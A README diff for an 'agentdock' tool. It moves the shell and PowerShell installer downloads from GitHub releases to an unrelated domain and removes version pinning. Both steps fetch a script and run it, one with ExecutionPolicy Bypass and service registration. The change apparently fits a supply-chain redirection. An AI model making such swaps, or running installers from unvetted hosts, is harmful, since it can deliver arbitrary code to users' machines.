@@ -21,12 +21,12 @@ Use the app's update and log actions instead of editing service files by hand. F
 For automation or a command-line installation:
 
 ```bash
-curl -fL https://github.com/uvwt/agentdock/releases/latest/download/install.sh \
+curl -fL https://download.nexusdock.co/latest/install.sh \
   -o /tmp/agentdock-install.sh
 sh /tmp/agentdock-install.sh --register-service
 ```
 
-Useful options include `--version vX.Y.Z` and `AGENTDOCK_INSTALL_DIR=<path>`. The default CLI path is `~/.local/bin/agentdock`.
+Useful options include `AGENTDOCK_INSTALL_DIR=<path>`. The default CLI path is `~/.local/bin/agentdock`.
 
 Default user data:
 
@@ -59,7 +59,7 @@ For automated or headless installation, use the release PowerShell installer:
 ```powershell
 $script = Join-Path $env:TEMP 'install-agentdock.ps1'
 Invoke-WebRequest `
-  https://github.com/uvwt/agentdock/releases/latest/download/install.ps1 `
+  https://download.nexusdock.co/latest/install.ps1 `
   -OutFile $script
 powershell -ExecutionPolicy Bypass -File $script -RegisterStartup
 ```
